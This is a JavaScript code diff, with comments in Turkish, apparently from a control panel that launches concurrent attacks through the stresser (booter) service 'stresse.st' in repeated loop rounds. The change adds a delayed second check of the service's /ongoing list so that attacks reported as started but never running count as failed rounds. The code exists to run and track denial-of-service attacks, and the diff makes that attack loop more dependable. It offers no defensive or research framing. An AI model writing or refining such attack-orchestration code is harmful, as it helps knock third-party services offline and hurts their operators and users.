@@ -504,6 +504,15 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
     newIds = [...afterIds].filter((id) => !beforeIds.has(id) && !activeAttacks[id]);
   }
 
+  // stresse.st "success" dedi ama hic ID yoksa: /ongoing gec guncellenebilir,
+  // yanlis negatif uretmemek icin bir kez daha dogrula.
+  if (newIds.length === 0 && (data?.status === 'success' || data?.message === 'Attack started')) {
+    console.warn(`[launchAttacksGet] success ama ID yok; ikinci dogrulama yapiliyor...`);
+    await new Promise((r) => setTimeout(r, 4000));
+    const retryIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
+    newIds = [...retryIds].filter((id) => !beforeIds.has(id) && !activeAttacks[id]);
+  }
+
   console.log(`[launchAttacksGet] before=${beforeIds.size} responseIds=${responseIds.length} after=${afterIds.size} new=${newIds.length} requested=${concurrents}`);
 
   if (newIds.length === 0) {
@@ -515,7 +524,10 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
   return {
     data,
     attackIds: newIds.slice(0, concurrents),
-    elapsedSec: 0
+    elapsedSec: 0,
+    // success denip hic ID dogrulanamadiysa false; loop ve endpoint'ler buna gore
+    // "sahte basari"yi gercek hata olarak isler.
+    verified: !(newIds.length === 0 && (data?.status === 'success' || data?.message === 'Attack started'))
   };
 }
 
@@ -1593,7 +1605,7 @@ async function runLoopRound(loopId) {
   // Tek istekte istenen concurrents kadar saldiri baslat.
   // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
   try {
-    const { data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
+    const { data, attackIds, elapsedSec, verified } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
     if (attackIds.length > 0) {
       roundSuccesses = attackIds.length;
       loop.roundAttackIds = attackIds;
@@ -1604,10 +1616,15 @@ async function runLoopRound(loopId) {
       if (attackIds.length !== loop.params.concurrents) {
         console.warn(`[loop ${loopId}] round ${round} UYARI: stresse.st ${loop.params.concurrents} yerine ${attackIds.length} attackId dondurdu`);
       }
-    } else if (data?.status === 'success' || data?.message === 'Attack started') {
+    } else if (verified && (data?.status === 'success' || data?.message === 'Attack started')) {
       roundSuccesses = loop.params.concurrents;
       loop.roundAttackIds = [];
       console.log(`[loop ${loopId}] round ${round} basarili: ${roundSuccesses} saldiri baslatildi (ID bulunamadi, /ongoing'den gorunecek)`);
+    } else if (data?.status === 'success' || data?.message === 'Attack started') {
+      // Sahte basari: stresse.st "Attack started" dedi ama saldiri /ongoing'de yok.
+      // Turu basarisiz say ki panelde gercek gorunsu (method sessizce reddediliyor).
+      roundError = new Error('stresse.st "Attack started" dondu ancak saldiri dogrulanamadi (method sessizce reddediliyor olabilir)');
+      console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
     } else {
       roundError = new Error(`GET /api basarisiz: ${data?.message || 'attackId bulunamadi'}`);
       console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
